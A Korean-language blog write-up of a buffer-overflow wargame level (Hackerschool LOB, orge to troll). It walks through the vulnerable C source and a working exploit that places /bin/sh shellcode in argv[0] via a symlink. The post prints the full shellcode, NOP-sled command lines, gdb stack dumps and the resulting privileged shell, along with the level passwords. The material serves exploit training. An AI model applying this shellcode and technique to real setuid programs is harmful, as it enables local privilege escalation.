---
layout: post
title: "[Wargame] 해커스쿨 BoF LEVEL8 (orge -> troll) : check argc"
date: 2015-11-13 22:30
comments: true
categories:  wargame
tags: [bof]
---

- id = orge 
- pw = timewalker

<!--more-->

## 1. 문제 : trolle.c

```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - troll
        - check argc + argv hunter
*/
#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
        char buffer[40];
        int i;

        // here is changed
        if(argc != 2){
                printf("argc must be two!\n");
                exit(0);
        }

        // egghunter
        for(i=0; environ[i]; i++)
                memset(environ[i], 0, strlen(environ[i]));

        if(argv[1][47] != '\xbf')
        {
                printf("stack is still your friend.\n");
                exit(0);
        }

        // check the length of argument
        if(strlen(argv[1]) > 48){
                printf("argument is too long!\n");
                exit(0);
        }

        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);

        // buffer hunter
        memset(buffer, 0, 40);

        // one more!
        memset(argv[1], 0, strlen(argv[1]));
}
```

이번에 추가된 제약사항은 

- `argc==2` 즉, argument 는 하나만 사용해야 함.
-  `argv[1]` 까지 0으로 밀어버린다.


```c
        // here is changed
        if(argc != 2){
                printf("argc must be two!\n");
                exit(0);
        }
...
        // one more!
        memset(argv[1], 0, strlen(argv[1]));
```

## 2. shellcode 를 명령어에 올려라

그렇다면 가능한 공격방법은 무엇일까 ? 
처음에는 방법이 있을까 했는데... 아무래도 `argv[0]` 인 명령어에 shellcode 를 올려놓고, 이를 이용할 수 밖에 없을 것 같다. 

shellcode를 `argv[0]` 에 올려놓고 사용할 수 있는 방법을 좀 고민하였다. 처음에는 command injection 형태로 시도하다가 그냥 symbolic link 를 걸어서 사용하였다.

그런데, 기존에 사용하던 shellcode 를 이름으로 실행 파일을 symbolic link 를 거는데 자꾸 에러가 나는거다.  shellcode 안에 `\x2f`가 `\` 이므로 파일 이름이 될 수 없어서 발생하는 에러라는거다.

```bash
$ ln -s troll2 `python -c 'print "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"'`
ln: cannot create symbolic link `j
                                  Xfh-pRjhh/bash/binRQS' to `troll2': No such file or directory
```

그렇다면 `\x2f` 가 들어가 있지 않은 shellcode 를 구해야한다.<br>
[Polymorphic Shellcode /bin/sh - 48 bytes by Jonathan Salwan](http://farlight.org/index.html?file=platforms/lin_x86/shellcode/13312.c&name=linux/x86---/bin/sh---polymorphic---shellcode---48---bytes&credit=Jonathan---Salwan&id=44483&isAdvisory=0)

다행히 compile 해서 실행하는데, 잘 동작하는거다. 이걸로 try 해보자.

```c
/*

 Title: 	Polymorphic Shellcode /bin/sh - 48 bytes
 Author: 	Jonathan Salwan
 Mail:		submit [!] shell-storm.org 

 	! DataBase of shellcode : http://www.shell-storm.org/shellcode/


 Original Informations
 =====================

 Disassembly of section .text:

  08048060  <.text>:
  8048060:	 31 c0                	 xor    %eax,%eax
  8048062:	 50                   	 push   %eax
  8048063:	 68 2f 2f 73 68       	 push   $0x68732f2f
  8048068:	 68 2f 62 69 6e       	 push   $0x6e69622f
  804806d:	 89 e3                	 mov    %esp,%ebx
  804806f:	 50                   	 push   %eax
  8048070:	 53                   	 push   %ebx
  8048071:	 89 e1                	 mov    %esp,%ecx
  8048073:	 99                   	 cltd   
  8048074:	 b0 0b                	 mov    $0xb,%al
  8048076:	 cd 80                	 int    $0x80


*/

#include "stdio.h"

char shellcode[] =	 "\xeb\x11\x5e\x31\xc9\xb1\x32\x80"
					"\x6c\x0e\xff\x01\x80\xe9\x01\x75"
					"\xf6\xeb\x05\xe8\xea\xff\xff\xff"
					"\x32\xc1\x51\x69\x30\x30\x74\x69"
					"\x69\x30\x63\x6a\x6f\x8a\xe4\x51"
			 		"\x54\x8a\xe2\x9a\xb1\x0c\xce\x81";

int main()
{
    printf("Polymorphic Shellcode - length: %d\n",strlen(shellcode));
    (*(void(*)()) shellcode)();
    
    return 0;
}

// milw0rm.com [2009-08-11]
```

## 3. 공격실패

이번 문제와 동일하게 stack 을 확인해서 선택한 `LR` 은 `0xbffffd54`.

![img](https://raw.githubusercontent.com/humb1ec0ding/humb1ec0ding-etc/master/2015/11/stage8-1.png)


```bash
0xbffffd36:      ""
0xbffffd37:      "i686"
0xbffffd3c:      "/home/orge/", '\220' <repeats 50 times>, "ë\021^1É±2\200l\016 \001\200é\001uöë\005èê   2ÁQi00tii0cjo\212äQT\212â\232±\fÎ\201"
0xbffffdaa:      'A' <repeats 44 times>, "Tý ¿"
0xbffffddb:      ""                            
```

gdb 로 debugging를 해보면 shellcode 로 jump 하는 것까지 정상적으로 되는데, 이상하게 실제 실행을 하면 계속 fault 가 나는 것이다.  그렇다면.. gdb 실행환경과 실제 동작환경에서 stack 이 다르게 잡히면서 `LR` 이 달라지는 것이 아닐까 ?

## 4. 실행환경과 GDB 실행 시 명령어 위치 확인

소스 맨 앞에 `argv[0]` 위치를 찍는 함수를 넣고 gdb와 실제 실행환경에서 실행하여 값을 확인하여 보자.

```c
        printf("argv[0] : %p\n", argv[0]);     
```

### 4.1 실제 실행환경 => `0xbffffcfd`

```bash
$ /home/orge/`python -c 'print "\x90"*50 + "\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"'`           
argv[0] : 0xbffffcfd
argc must be two!  
```

### 4.2 GDB 실행 환경  => `0xbffffd3c`

```bash
$ gdb /home/orge/`python -c 'print "\x90"*50 + "\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"'`    
GNU gdb 19991004
Copyright 1998 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you are
welcome to change it and/or distribute copies of it under certain conditions.
Type "show copying" to see the conditions.
There is absolutely no warranty for GDB.  Type "show warranty" for details.
This GDB was configured as "i386-redhat-linux"...
(gdb) r `python -c 'print "A"*44 + "\x3b\xfb\xff\xbf"'`
Starting program: /home/orge/ë^1É±2l éuöëèê   2ÁQi00tii0cjoäQTâ±
                                                                Î `python -c 'print "A"*44 + "\x3b\xfb\xff\xbf"'`
argv[0] : 0xbffffd3c
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA;û ¿
...
```

```
0xbffffd36:      ""
0xbffffd37:      "i686"
0xbffffd3c:      "/home/orge/", '\220' <repeats 50 times>, "ë\021^1É±2\200l\016 \001\200é\001uöë\005èê   2ÁQi00tii0cjo\212äQT\212â\232±\fÎ\201"
0xbffffdaa:      'A' <repeats 44 times>, ";û ¿"
---Type <return> to continue, or q <return> to quit---
0xbffffddb:      ""
0xbffffddc:      ""   
```

### 4.2 비교

다시 곰곰히 생각을 해보니깐 gdb 실행시에 실행한 다음의 stack 사용을 동일하겠지만 gdb 실행하기 위한 command line arugment 받는 부분은 환경이 서로 다를 수도 있으니깐 다를 수도 있을 것 같은 생각이 든다. 

좀 이상한 것은 gdb 쓰는 경우가 stack 을 많이 써서 stack pointer 가 더 높게 설정이 되어 있을 것 같은데 실행명령어 경우가 더 높게 잡혀있는 것은 아직은 잘 모르겠다. 

## 5. 공격

실제 exploit 을 위해서는 명령실행환경에서의 `agv[0]`의 위치를 정확하게 알아야 한다. 


### 5.1 위치 출력하도록 코드 빌드 

앞에서도 확인을 했지만 현재는 운이 좋아 소스를 빌드하여 위치를 출력하도록하여 알아낼 수 있다. 절대 path 로 실행하는지, 상대 path 로 실행하는지에 따라서 명령어 string 길이가 다르기 때문에 위치가 서로 다른 것을 알 수 있다.

#### 5.1.1 절대 path 실행

```bash
$ /home/orge/`python -c 'print "\x90"*50 + "\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"'`  
argv[0] : 0xbffffcfd
argc must be two!  
```

#### 5.1.2 상대 path 실행

```bash
$ ./`python -c 'print "\x90"*50 + "\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"'` 
argv[0] : 0xbffffd18
argc must be two! 
```

### 5.2 공격

혼동이 없도록 절대 path 로 실행한 경우을 이용하고 `argv[0]` 앞부분에는 `/home/org/` 값이 들어갈테니깐 그 뒤에 NOP 를 충분히 넣고 그 중간에 `$pc` 가 떨어지도록하면 공격 가능할 것 같다. 

아래 stack memory 는 **GDB 실행해서 잡은 것**이므로 **실제로는 이보다 `0x40` 정도 stack 이 위에 잡히게 되는 것**을 고려하자.

![img](https://raw.githubusercontent.com/humb1ec0ding/humb1ec0ding-etc/master/2015/11/stage8-3.png)

그래서 선택한 값은 `0xbffffd04`

```bash
$ /home/orge/`python -c 'print "\x90"*50 + "\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"'` `python -c 'print "A"*44 + "\x04\xfd\xff\xbf"'`  
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAýü ¿
bash$ id
uid=507(orge) gid=507(orge) euid=508(troll) egid=508(troll) groups=507(orge)
```

## 6. 다음 단계 정보

```bash
bash$ id
uid=507(orge) gid=507(orge) euid=508(troll) egid=508(troll) groups=507(orge)

bash$ my-pass
euid = 508
aspirin  
```

## 7. 의문점

### 7.1 Stack 차이

실제실행과 gdb 사용 시 stack 잡히는 것이 다른 것은 아직 정확하게 잘 모르겠다. 

### 7.2 소스 빌드 못하고, gdb 로만 `&agv[0]` 주소 파악 

`&argv[0]` 값을 직접 알아낼 수 없고, gdb  만 사용할 수 있는 경우라면 ?

NOP 를 크게 넣어준다면 두 경우의 stack 위치 차이에 NOP 사이에 들어온다면 gdb 로만 위치 확인하고도 동작하지 않을까 ?

몇 번 해봤는데.. 잘 안 된다. T_T; 


### 7.3 `&agv[0]` 에 바로 jump 하는 경우

절대 경로로 실행한 경우에 `&agv[0]` 값에는  `/home/orge/` 값이 있을텐데 이로 바로 jump 를 한 경우에 gdb 에서 fault 가 나는데, 실제 실행 시에는 정상적인 동작을 한다. 왜 일까 ??

```bash
(gdb) x/100i 0xbffffd3c
0xbffffd3c:     das
0xbffffd3d:     push   $0x2f656d6f
0xbffffd42:     outsl  %ds:(%esi),(%dx)
0xbffffd43:     jb     0xbffffdac
0xbffffd45:     gs
0xbffffd46:     das
0xbffffd47:     nop
0xbffffd48:     nop
0xbffffd49:     nop
0xbffffd4a:     nop
0xbffffd4b:     nop
...
```

